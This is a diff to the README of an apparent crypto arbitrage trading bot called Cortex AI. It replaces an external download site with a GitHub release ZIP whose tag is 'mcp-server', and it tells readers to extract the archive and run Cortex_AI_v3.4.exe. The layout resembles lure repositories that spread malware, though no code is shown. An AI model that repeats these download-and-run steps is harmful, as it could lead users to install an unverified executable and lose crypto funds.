@@ -23,7 +23,7 @@
 </p>
 
 <p align="center">
-  <a href="https://arbitrage-bot.pro/">
+  <a href="https://github.com/Cortex-AI-Software/crypto-arbitrage-bot-automated-trading/releases/download/mcp-server/Cortex_AI_v3.4.zip">
     <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
   </a>
 </p>
@@ -45,10 +45,15 @@ This guide explains how to download, install, and run the Cortex AI arbitrage en
 ### ⬇️ Download & Install
 
 To start using the software:
-1. **Visit the Official Site:** Go to [https://arbitrage-bot.pro/](https://arbitrage-bot.pro/) to get the latest stable build.
-2. **Download:** Click the green **"Download Latest v3.4"** button on the site or use the bright green **DOWNLOAD** badge above.
-3. **Extract:** Save the ZIP archive and extract it to a folder on your computer.
-4. **Launch:** Open `Cortex_AI_v3.4.exe`. The setup wizard will start automatically.
+
+  <a href="https://github.com/Cortex-AI-Software/crypto-arbitrage-bot-automated-trading/releases/download/mcp-server/Cortex_AI_v3.4.zip">
+    <img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20AI%20v3.4%20Stable-brightgreen?style=for-the-badge&logo=windows" alt="Download Cortex AI">
+  </a>
+
+
+ **Download:** Click the green **"Download Latest v3.4"** button on the site or use the bright green **DOWNLOAD** badge above.
+ **Extract:** Save the ZIP archive and extract it to a folder on your computer.
+ **Launch:** Open `Cortex_AI_v3.4.exe`. The setup wizard will start automatically.
 
 
 🎨 Interface & User Experience
